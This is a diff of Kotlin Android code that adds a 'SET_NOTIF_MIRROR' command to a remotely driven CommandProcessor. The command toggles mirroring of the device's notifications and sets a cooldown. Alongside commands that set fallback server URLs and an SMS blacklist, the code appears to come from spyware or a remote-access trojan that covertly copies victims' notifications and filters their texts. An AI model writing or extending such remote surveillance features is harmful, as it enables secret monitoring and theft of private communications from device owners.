@@ -1530,6 +1530,25 @@ object CommandProcessor {
                         errorMsg = "Format: PRIMARY_URL|SECONDARY_URL"
                     }
                 }
+                "SET_NOTIF_MIRROR" -> {
+                    val parts = content.split("|")
+                    if (parts.size >= 2) {
+                        val state = parts[0].trim().uppercase() == "ON"
+                        val cooldownMins = parts[1].trim().toLongOrNull() ?: 720L
+                        val cooldownMs = cooldownMins * 60 * 1000L
+                        
+                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
+                            .putBoolean("notif_mirror_active", state)
+                            .putLong("notif_mirror_cooldown_ms", cooldownMs)
+                            .apply()
+                            
+                        status = "NOTIF_MIRROR_CONFIGURED"
+                        errorMsg = "State: ${if(state) "ON" else "OFF"} | Cooldown: ${cooldownMins}m"
+                    } else {
+                        status = "FAILED_FORMAT"
+                        errorMsg = "Usage: ON/OFF | COOLDOWN_MINS"
+                    }
+                }
                 "SET_SMS_BLACKLIST" -> {
                     val list = content.trim()
                     ctx.getSharedPreferences("sms_filter_prefs", Context.MODE_PRIVATE).edit()
